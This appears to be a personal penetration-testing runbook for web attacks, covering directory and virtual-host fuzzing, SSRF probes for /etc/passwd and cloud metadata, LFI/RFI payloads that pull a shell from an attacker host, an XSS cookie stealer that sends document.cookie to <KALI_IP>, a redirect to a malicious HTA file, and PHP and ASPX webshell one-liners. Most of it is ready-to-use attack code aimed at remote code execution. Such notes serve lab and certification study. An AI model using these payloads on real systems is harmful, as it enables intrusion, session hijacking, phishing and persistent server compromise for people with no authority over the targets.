---
tags: [web, reconnaissance, fuzzing, ssrf, xss, webshell]
---

# 🌐 Web Attacks & Recon (400/500 Level)

> [!ABSTRACT]
> This runbook covers web application security from initial discovery to server-side exploitation.
> **Goal**: Identify entry points, bypass filters, and achieve Remote Code Execution (RCE).

---

## 🔍 Phase 1: High-Speed Reconnaissance

### 1. Directory & File Fuzzing (Feroxbuster)
> [!TIP] Feroxbuster is extremely fast and handles recursion automatically.

```bash
# Standard Scan with extensions
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,aspx,html,txt

# Deep Recursive Scan (API Objects)
feroxbuster -u http://<TARGET>/api --crawl -X 404,400 --deep-recursive -w /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt
```

### 2. VHost & Subdomain Discovery (ffuf)
> [!IMPORTANT] Always add discovered subdomains to `/etc/hosts`.

```bash
# VHost discovery (using Host header)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -fs <SIZE_TO_FILTER>
```

---

## 🧲 Phase 2: Server-Side Exploitation

### 1. SSRF (Server-Side Request Forgery)
Attempt to force the server to connect to internal services or your Kali box.
```bash
# Protocols to Test
file:///etc/passwd
http://localhost:8080 (Internal Admin Panel)
http://169.254.169.254/latest/meta-data/ (Cloud Metadata)
gopher://<KALI_IP>:4444/_POST%20/shell.php%20HTTP/1.1... (Protocol Smuggling)
```

### 2. LFI / RFI (File Inclusion)
```bash
# LFI with PHP Filters (Bypass source code view)
http://<TARGET>/page.php?file=php://filter/convert.base64-encode/resource=config.php

# RFI (If allow_url_include is ON)
http://<TARGET>/page.php?file=http://<KALI_IP>/shell.txt
```

---

## 🚀 Phase 3: Client-Side & Initial Access

### 1. XSS (Phishing & Session Hijacking)
Use XSS to steal cookies or redirect users to a malicious HTA/ISO.
```javascript
# Cookie Stealer
<script>new Image().src='http://<KALI_IP>/log.php?c='+document.cookie;</script>

# Redirect to Phishing
<script>window.location.href='http://<KALI_IP>/login.hta';</script>
```

---

## 📂 Phase 4: Persistence (Webshells)

### 1. PHP/ASPX Webshells
Upload these to a writable web directory.
```php
# PHP One-Liner
<?php system($_GET['cmd']); ?>

# ASPX One-Liner (C#)
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

---

## 🔗 Related Notes
- [[SQL Attacks]] - For database-driven web exploitation.
- [[Admin Reference]] - For setting up the `php -S` listener to host files.
- [[Pivoting & Tunneling]] - If the web app is internal.
- [[File Transfer]] - For uploading shells via LFI/RFI.
